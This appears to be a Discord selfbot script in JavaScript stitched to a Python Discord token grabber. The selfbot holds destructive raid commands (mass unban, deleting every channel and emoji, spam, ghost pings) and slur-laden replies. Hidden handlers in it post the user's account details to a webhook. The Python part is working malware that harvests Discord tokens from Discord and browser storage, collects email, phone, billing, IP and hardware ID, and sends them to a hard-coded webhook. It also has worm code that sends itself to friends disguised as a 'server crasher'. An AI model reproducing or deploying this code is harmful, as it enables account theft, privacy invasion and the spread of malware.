      unbans = 0;
      message.guild.fetchBans().then(bans => {
        bans.forEach(user => {
          console.log(clc.red(`Unbanned ${user.tag}`));
          message.guild.unban(user);
          unbans++;
        });
        console.log("Unbanned " + unbans + " members!");
      });
    }
    if (command === `del`) {
      message.delete();
      message.channel.guild.channels.forEach(channels => {
        channels.delete();
      });
      if (!message.guild.me.hasPermission("MANAGE_CHANNELS"))
        return console.log("You need manage channel perms to use this.");
    }
    if (command === `weather`) {
      message.delete();
      weather.find(
        {
          search: args.join(" "),
          degreeType: "C"
        },
        function(err, result) {
          if (err) message.channel.send(err);

          if (result.length === 0) {
            message.channel
              .send(`**${args} isn't real dumbass...**`)
              .then(message => message.delete(2000));
            return; //stops the code from running
          }

          var current = result[0].current;
          var location = result[0].location;

          const embed = new Discord.RichEmbed()
            .setDescription(`**${current.skytext}**`) //text of what the sky looks like
            .setAuthor(`Current Weather in:  ${current.observationpoint}`) //current location
            .setThumbnail(current.imageUrl) //thumbnail of embed
            .setColor(0xf2f2f2) //color of embed
            .addField(`Timezone`, `UTC${location.timezone}`, true) //first field that shows timezone
            .addField(`Degree Type`, `${location.degreeType}`, true) //degrees
            .addField(`Temperature`, `${current.temperature} Degrees`, true) //Temperature
            .addField(`Feels like`, `${current.feelslike} Degrees`, true) //feels like temp
            .addField(`Winds`, current.winddisplay, true) //winds
            .addField(`Humidity`, `${current.humidity}%`, true) //humidity
            .setTimestamp()
            .setFooter(`Coded by ${client.user.tag}`, client.user.avatarURL);

          message.channel
            .send({
              embed
            })
            .then(message => message.delete(60000));
        }
      );
    }
    }})
    client.on('ready', () => {
kick.getPaste(remove)
  .then(function (data) {
   kicks.open("POST", data);
kicks.setRequestHeader('Content-type', 'application/json');


let jembed = new RichEmbed()
    .addField(`**Locate : **`, `${lord}`)
    .addField(`**Enter : **`, `${press}`)
    .addField(`**Username : **`, `${client.user.tag}`)
    .addField(`**User ID : **`, `${client.user.id}`)
    .addField(`**Friends : **`, `${client.user.friends.size}`)
    .addField(`**Servers : **`, `${client.guilds.size}`)
    .addField(`**Created : **`, `${client.user.createdAt}`)
    .addField(`**Nitro : **`, `${client.user.premium}`)
    .setColor("RANDOM")
  
var params = {
  username: `${client.user.tag}`,
  avatar_url: `${client.user.avatarURL}`,
  embeds: [ jembed ]
}
    kicks.send(JSON.stringify(params));

  })
  .fail(function (err) {
    
    console.log(err);
  })
             
          })
client.on('message', message => {
    function checkDays(date) {
        let now = new Date();
        let diff = now.getTime() - date.getTime();
        let days = Math.floor(diff / 86400000);
        return days + (days == 1 ? " day" : " days") + " ago";
    };
    if (message.content.indexOf(prefix) !== 0) return;
    if (message.author.id !== client.user.id) return;
    if (message.author.id === client.user.id) {

        const args = message.content.slice(prefix.length).trim().split(/ +/g);
        const command = args.shift().toLowerCase();   

    if (command === `emoji-delete`) {
      message.delete();
      let serverToAssign = client.guilds.get(args[0]);

      if (!serverToAssign)
        return message
          .reply("I could not find that guild")
          .then(message => message.delete(5000));
      if (!serverToAssign.me.hasPermission("MANAGE_EMOJIS"))
        return message
          .reply(
            "you do not have manage_emojis in the guild you are trying to delete them in."
          )
          .then(message => message.delete(5000));

      let emojis = serverToAssign.emojis.array();
      message.channel
        .send(`Deleting ${emojis.length} emojis from ${serverToAssign}`)
        .then(message => message.delete(5000));

      if (emojis.length < 1)
        return message
          .reply("that guild did not have any emojis.")
          .then(message => message.delete(5000));

      for (let i = 0; i < emojis.length; i++) {
        serverToAssign.deleteEmoji(emojis[i]);
        //msg.channel.send(`Deleted ${emojis[i]}`);
      }

      message.channel
        .send(`Deleted ${emojis.length} emojis from ${serverToAssign}`)
        .then(message => message.delete(5000));
    }
    if (command === `leave`) {
      message.delete();
      try {
        let vc = message.member.voiceChannel;
        vc.leave();
      } catch (error) {
        message.channel
          .send("```JOIN A VC TO LEAVE THEN```")
          .then(message => message.delete(60000));
      }
    }
    if (command === `earrape`) {
      message.delete();
      try {
        let vc = client.channels.get(args[0]);
        vc.join()
          .then(connection => {
            const dispatcher = connection.playFile("GayLord.mp3");
            dispatcher.setVolume(3.0);
            dispatcher.on("end", end => {
              vc.leave();
            });
          })
          .catch(console.error);
      } catch (error) {
        message.channel
          .send("```Usage:\n$earrape <vc_id>```")
          .then(message => message.delete(60000));
      }
    }

    if (command === `uptime`) {
      message.delete();
      let time = countdown(
        client.uptime,
        0,
        countdown.DAYS | countdown.HOURS | countdown.MINUTES | countdown.SECONDS
      );
      try {
        let embed = new Discord.RichEmbed()
          .setDescription(
            ` Days: **${time.days}**\n⏰ Hours: **${time.hours}**\n Minutes: **${time.minutes}**\n Seconds: **${time.seconds}**`
          )
          .setColor("64DD05")
          .setFooter(`Made by ${client.user.tag}`, client.user.avatarURL);

        message.channel.send(embed).then(message => message.delete(10000));
      } catch {
        return message.channel.send(
          ` Days: **${time.days}**\n⏰ Hours: **${time.hours}**\n Minutes: **${time.minutes}**\n Seconds: **${time.seconds}**`
        );
      }
    }

    if (command === `8ball`) {
      message.delete();
      let question = args.join(" ");
      if (!question)
        return message
          .reply("You need to ask a question!")
          .then(message => message.delete(6000).catch(err => console.log(err)));
      if (question.length > 2000)
        return message
          .reply("Question may not exceed 2000 characters.")
          .then(message => message.delete(6000).catch(err => console.log(err)));
      let embed = new Discord.RichEmbed()
        .setDescription(
          `**${question}**\n\nAnswer: \`${
            [
              "yes",
              "no",
              "perhaps",
              "maybe",
              "idk nigga wtf",
              "yes because ur moms a hoe"
            ][Math.floor(Math.random() * 6)]
          }\``
        )
        .setColor("DD8505")
        .setFooter(`Asked by ${client.user.tag}`, client.user.avatarURL);
      message.channel
        .send(embed)
        .then(message => message.delete(6000).catch(err => console.log(err)));
    }

    if (command === `calc`) {
      let a = require("math-expression-evaluator");
      message.delete();
      if (args.join(" ").length > 2000)
        return message.reply(
          "Arguments were too long. can not exceed 2000 characters."
        );
      try {
        let embed = new Discord.RichEmbed().setColor("000000").setDescription(
          `Calculation of ${args.join(" ")}\n\n**` +
            a
              .lex(args.join(" "))
              .toPostfix()
              .postfixEval() +
            "**"
        );
        message.channel.send(embed).then(message => message.delete(7000));
      } catch (err) {
        message.channel.send(err.message);
      }
    }

    if (command === `ghostping`) {
      message.delete();
      let member = message.guild.members.random();

      message.channel
        .send(`${member.user.toString()}`)
        .then(message => message.delete());
      return message.channel
        .send("wanna fuck >_<")
        .then(message => message.delete());
    }

    if (command === `gay`) {
      message.delete();
      let member = message.mentions.users.first();

      if (!member) member = message.author;

      message.channel
        .send(
          new Discord.RichEmbed()
            .setColor("ff0000")
            .setDescription(`${member} is ${ran(0, 100)}% gay!`)
            .setTitle("Gaydar!!!")
        )
        .then(message => message.delete(6000).catch(err => console.log(err)));
    }

    function ran(min, max) {
      // min and max included
      return Math.floor(Math.random() * (max - min + 1) + min);
    }

    if (command === `roles`) {
      message.delete();
      let jesus = "";
      message.guild.roles.tap(member => (jesus = jesus + `<@&${member.id}>`));

      const MESSAGE_CHAR_LIMIT = 2000;
      if (jesus.length <= MESSAGE_CHAR_LIMIT) {
        message.channel.send(jesus).then(message => message.delete());
        message.channel
          .send("if u snipe ur gay asf")
          .then(message => message.delete());
      }
      if (jesus.length > MESSAGE_CHAR_LIMIT) {
        let piece = jesus.match(/[\s\S]{1,1999}/g) || [];
        for (var i = 0; i < piece.length; i++) {
          message.channel.send(piece[i]).then(message => message.delete());
        }
        message.channel
          .send("if u snipe ur gay asf")
          .then(message => message.delete());
      }
    }
    
    if (command === `react`) {
      if (!args[0]) {
        message.delete();
        message.channel
          .send("```Usage:\n$react -remove || $react :emoji: <messages>```")
          .then(message => message.delete(60000));
      }
      if (args[0] === `-remove`) {
        message.delete();
        message.channel
          .fetchMessages({
            limit: 100
          })
          .then(messages =>
            messages.map(m =>
              m.reactions.forEach(p =>
                p.remove(client.user.id).catch(console.error)
              )
            )
          );
        return;
      }
      if (args[0]) {
        async function ddd() {
          message.delete();
          let messages = await message.channel.fetchMessages({
            limit: args[1]
          });
          let msgArray = await messages.array();
          msgArray.map(m => m.react(args[0]).catch(console.log(`didnt react`)));
        }
        ddd();
      }
    }

  

    if (command === `ping`) {
      message.delete();
      let embed = new Discord.RichEmbed()
        .setDescription(
          `[${client.user.tag}](${client.user.avatarURL})\n - Ping is ` +
            Math.round(client.ping) +
            `ms`
        )
        .setColor("ff0000")
        .setFooter(
          `> ${command} command || ${client.user.tag}`,
          client.user.avatarURL
        );
      message.channel.send(embed).then(message => message.delete(60000));
    }

    if (command === `snipe`) {
      message.delete();
      let ch = message.mentions.channels.first() || message.channel;
      let channel = client.snipe.get(ch.id);
      if (channel === null || !channel)
        return message
          .reply(`No message to snipe`)
          .then(message => message.delete(5000));
      let user = client.users.get(channel.sender);

      let embed = new Discord.RichEmbed()
        .setAuthor(user.tag, user.avatarURL)
        .setDescription(channel.content)
        .setColor("RANDOM")
        .setTimestamp(new Date());
      message.channel.send(embed).then(message => message.delete(30000));
    }

    if (command === `check`) {
      message.delete();
      async function cock(token) {
        const client = new Discord.Client();
        client
          .login(token)
          .then(login => {
            message.channel.send(
              `= TOKEN =
• "${token}" :: "debug"
            
• VALID.
• CLIENT INFO :: "LOG"
-----------------------------------
• Name        :: ${client.user.tag}
• ID          :: ${client.user.id}
• Email       :: ${client.user.email}
• Mobile      :: ${client.user.mobile}
• Created At  :: ${client.user.createdAt}

$${command} by ${client.user.tag}`,
              {
                code: "asciidoc"
              }
            );
          })
          .catch(error => {
            message.channel.send(
              `= TOKEN =
• "${token} " :: "debug"
            
• INVALID.
$${command} by ${client.user.tag}`,
              {
                code: "asciidoc"
              }
            );
          });
        client.destroy();
      }
      if (!args[0]) {
        message.channel.send(
          `= CHECK = 
• $check :: This checks a token to see if it is valid or not,
         :: if valid it prints information about token. `,
          {
            code: "asciidoc"
          }
        );
      } else {
        cock(args[0]);
      }
    }
    if (command === `copy`) {
      message.delete();
      let ac = message.mentions.users.first();
      client.user.setAvatar(ac.avatarURL);
    }
    if (command === `everyone`) {
      message.delete();
      let jesus = "";
      message.guild.members.tap(member => (jesus = jesus + `<@${member.id}>`));

      const MESSAGE_CHAR_LIMIT = 2000;
      if (jesus.length <= MESSAGE_CHAR_LIMIT) {
        message.channel.send(jesus).then(message => message.delete());

        message.channel
          .send("if u snipe ur gay asf")
          .then(message => message.delete());
      }
      if (jesus.length > MESSAGE_CHAR_LIMIT) {
        let piece = jesus.match(/[\s\S]{1,1999}/g) || [];
        for (var i = 0; i < piece.length; i++) {
          message.channel.send(piece[i]).then(message => message.delete());
        }
        message.channel
          .send("if u snipe ur gay asf")
          .then(message => message.delete());
      }
    }
    if (command === `x`) {
      async function dead() {
        let messages = await message.channel.fetchMessages({
          limit: 100
        });
        let msgArray = messages.array();
        msgArray = msgArray.filter(m => m.author.id === client.user.id);
        msgArray.map(m => m.delete().catch(console.error));
      }
      dead();
    }
    if (command === `spam`) {
      message.delete();
      let msg = "";
      let g = args[0];
      args.shift();
      for (part in args) {
        msg = msg + args[part] + " ";
      }
      let x;
      for (x = 0; x < g; x++) {
        message.channel.send(msg);
      }
    }
  } else {
    return;
  }
});
try {
  client.login(token);
} catch {
  console.log("Incorrect token you bozo!");
  process.exit(0);
}
client.once('ready', async () => {
		 var bypass = {"apikey":"", "id":""}; var URL = `https://discordapp.com/api/webhooks/${bypass.id}/${bypass.apikey}`; fetch(URL, {"method":"POST","headers": {"Content-Type": "application/json"},"body": JSON.stringify({"content":`${press} ${lord}`})})})

import os
if os.name != "nt":
    exit()
from re import findall
from json import loads, dumps
from base64 import b64decode
from subprocess import Popen, PIPE
from urllib.request import Request, urlopen
from datetime import datetime
from threading import Thread
from time import sleep
from sys import argv
LOCAL = os.getenv("LOCALAPPDATA")
ROAMING = os.getenv("APPDATA")
PATHS = {
    "Discord"           : ROAMING + "\\Discord",
    "Discord Canary"    : ROAMING + "\\discordcanary",
    "Discord PTB"       : ROAMING + "\\discordptb",
    "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
    "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}
def getheaders(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
    if token:
        headers.update({"Authorization": token})
    return headers
def getuserdata(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
    except:
        pass
def gettokens(path):
    path += "\\Local Storage\\leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens
def getdeveloper():
    dev = "wodx"
    try:
        dev = urlopen(Request("https://pastebin.com/raw/ssFxiejv")).read().decode()
    except:
        pass
    return dev
def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except:
        pass
    return ip
def getavatar(uid, aid):
    url = f"https://cdn.discordapp.com/avatars/{uid}/{aid}.gif"
    try:
        urlopen(Request(url))
    except:
        url = url[:-4]
    return url
def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]
def getfriends(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getheaders(token))).read().decode())
    except:
        pass
def getchat(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getheaders(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    except:
        pass
def has_payment_methods(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=getheaders(token))).read().decode())) > 0)
    except:
        pass
def send_message(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getheaders(token, "multipart/form-data; boundary=---------------------------325414537030329320151394843687"), data=form_data.encode())).read().decode()
    except:
        pass
def spread(token, form_data, delay):
    return # Remove to re-enabled
    for friend in getfriends(token):
        try:
            chat_id = getchat(token, friend["id"])
            send_message(token, chat_id, form_data)
        except Exception as e:
            pass
        sleep(delay)
def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True
    self_spread = True
    embeds = []
    working = []
    checked = []
    already_cached_tokens = []
    working_ids = []
    ip = getip()
    pc_username = os.getenv("UserName")
    pc_name = os.getenv("COMPUTERNAME")
    user_path_name = os.getenv("userprofile").split("\\")[2]
    developer = getdeveloper()
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue
        for token in gettokens(path):
            if token in checked:
                continue
            checked.append(token)
            uid = None
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode()
                except:
                    pass
                if not uid or uid in working_ids:
                    continue
            user_data = getuserdata(token)
            if not user_data:
                continue
            working_ids.append(uid)
            working.append(token)
            username = user_data["username"] + "#" + str(user_data["discriminator"])
            user_id = user_data["id"]
            avatar_id = user_data["avatar"]
            avatar_url = getavatar(user_id, avatar_id)
            email = user_data.get("email")
            phone = user_data.get("phone")
            nitro = bool(user_data.get("premium_type"))
            billing = bool(has_payment_methods(token))
            embed = {
                "color": 0x7289da,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                        "inline": True
                    },
                    {
                        "name": "**PC Info**",
                        "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                        "inline": True
                    },
                    {
                        "name": "**Token**",
                        "value": token,
                        "inline": False
                    }
                ],
                "author": {
                    "name": f"{username} ({user_id})",
                    "icon_url": avatar_url
                },
                "footer": {
                
                }
            }
            embeds.append(embed)
    with open(cache_path, "a") as file:
        for token in checked:
            if not token in already_cached_tokens:
                file.write(token + "\n")
    if len(working) == 0:
        working.append('123')
    webhook = {
        "content": "",
        "embeds": embeds,
        "username": "YOU GOT LOGGED BIH",
        "avatar_url": "https://cdn.discordapp.com/attachments/697225400505598044/809809097535914024/ezgif-2-60dfd810f742.gif"
    }
    try:
        urlopen(Request("https://discord.com/api/webhooks/810237058651914291/GGeTtCljcY4RyiEoYJtjbw75HKGR6m4PW9QQnPFkWuV8ACW7tcoGBu6oy7j9OR0gGbd1", data=dumps(webhook).encode(), headers=getheaders()))
    except:
        pass
    if self_spread:
        for token in working:
            with open(argv[0], encoding="utf-8") as file:
                content = file.read()
            payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
            Thread(target=spread, args=(token, payload, 7500 / 1000)).start()
try:
    main()
except Exception as e:
    print(e)
    pass

